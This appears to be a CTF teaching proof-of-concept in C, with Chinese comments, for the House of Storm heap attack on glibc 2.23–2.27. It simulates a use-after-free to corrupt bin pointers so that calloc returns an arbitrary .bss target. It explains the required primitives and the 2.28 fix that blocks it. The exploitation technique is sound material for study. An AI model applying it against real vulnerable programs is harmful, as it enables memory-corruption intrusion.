/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_storm
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：一次 UAF，用来同时改写一个 unsorted chunk 和一个 largebin chunk 的链指针。
 * 核心流程：让 unsorted 和 largebin 这两条链在排序、插入时产生交叉写，从而在
 *   任意目标地址附近伪造出一个可分配的 chunk。
 * 成功判据：calloc 必须精确返回 target 这个地址。2.28 引入的 bdc3009 会在每次
 *   unsorted 摘链前检查 bck->fd==victim，从而封死这套组合链。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*
 * House of Storm 把 unsorted-bin attack 和旧版 large-bin 插入写组合起来：
 * 先把 unsorted victim 的 bk 改写成指向任意目标附近的地址，再让 largebin
 * 插入逻辑把一个真实堆指针错位写到目标的 size 字段。只要写出的高位字节
 * 能被分配器解释成一个与请求匹配的合法 size，它随后就会把这个”任意地址
 * 伪块”当作正常内存返回。
 *
 * 需要的漏洞原语：
 * - 能在释放后修改一个 unsorted chunk 的链指针；
 * - 能在释放后修改一个 largebin chunk 的 fd/bk_nextsize 等链指针；
 * - 已知目标地址，以及用于推导伪 size 的堆指针高位。
 *
 * 上游注释曾把范围写成 2.26~2.28；源码审计和 2.28 负向回归表明经典链
 * 实际只到 2.27。glibc 2.28 的提交 bdc3009 在每次 unsorted 摘链前验证
 * bck->fd == victim，伪 bk 不再能把 victim 指针转向任意地址。2.26~2.27
 * 还必须预先填满对应 tcache，避免关键块被 tcache 截走。
 *
 * 原始 PoC 作者：Maxwell “Strikeout” Dulin。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>

char filler[0x60];
/* 原始样例只留 0x60 字节 target，因而只能取堆指针的最高
 * 一个字节当 fake size，在常见 0x55... 映射下会固定撞上
 * NON_MAIN_ARENA/M bit 组合并不断要求重跑。扩大教学目标后，
 * 可在“最高 1/2/3 字节”三个窗口中选择满足标志位检查的值。
 * 0x1000000 字节 BSS 能承受第三种候选下 calloc 对 fake chunk 清零。
 */
char target[0x1000000];

int main(void) {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);

	char *unsorted = NULL;
	char *large;
	int shift = -1;
	size_t size = 0;
	void *fill[7];

	/* largebin 只能写入真实堆指针。把写入地址向前错开 shift
	 * 字节，fake->size 就只会读到指针的最高 1～3 字节。
	 * 枚举这三个窗口，找到一个合法的请求尺寸。
	 */
	mallopt(M_MMAP_MAX, 0);
	mallopt(M_MMAP_THRESHOLD, 0x20000000);

	for (int tries = 0; tries < 16 && shift < 0; tries++) {
		unsorted = malloc(0x4e8);
		malloc(0x18); // 保护块防止与 top 合并。

		int top = 0;
		for (size_t p = (size_t)unsorted; p > 0x20; p >>= 8)
			top++;

		for (int s = top - 1; s >= top - 3; s--) {
			size_t n = (((size_t)unsorted >> (8 * s)) & ~(size_t)1) - 0x10;
			if (n >= sizeof(target) - 0x20)
				continue;
			/* bit3 必须为 0；NON_MAIN_ARENA 置位时还需 IS_MMAPPED。 */
			if ((n & 8) || ((n & 4) && !(n & 2)))
				continue;
			shift = s;
			size = n;
			break;
		}

		// 推进 16 MiB 后再试，避免 PoC 的成功依赖 ASLR 运气。
		if (shift < 0 && !malloc(0x1000000))
			abort();
	}
	if (shift < 0)
		abort();

	// 小请求要先填满 tcache，才会继续走经典 bin 路径。
	if (size < 0x410) {
		for (int i = 0; i < 7; i++)
			fill[i] = malloc(size);
		for (int i = 0; i < 7; i++)
			free(fill[i]);
	}

	large = malloc(0x4d8);
	malloc(0x18);
	free(large);
	free(unsorted);

	// 把 0x4e0 块整理进 largebin，新的 0x4f0 块保持在 unsorted bin。
	unsorted = malloc(0x4e8);
	free(unsorted);

	char *fake = target - 0x10;
	/* UAF：unsorted->bk 把遍历引向 fake；large->bk_nextsize
	 * 则把堆指针错位写到 fake->size。
	 */
	((size_t *)unsorted)[1] = (size_t)fake;
	((size_t *)large)[1] = (size_t)fake + 8;
	((size_t *)large)[3] = (size_t)fake - 0x18 - shift;

	void *p = calloc(size, 1);
	if (p != target) {
		fprintf(stderr, "[-] Storm：结果=%p，目标=%p\n", p, target);
		abort();
	}

	memcpy(p, "STORM_OK", 9);
	if (memcmp(target, "STORM_OK", 9) != 0)
		abort();

	puts("[+] Storm：.bss 目标命中");
	return 0;
}
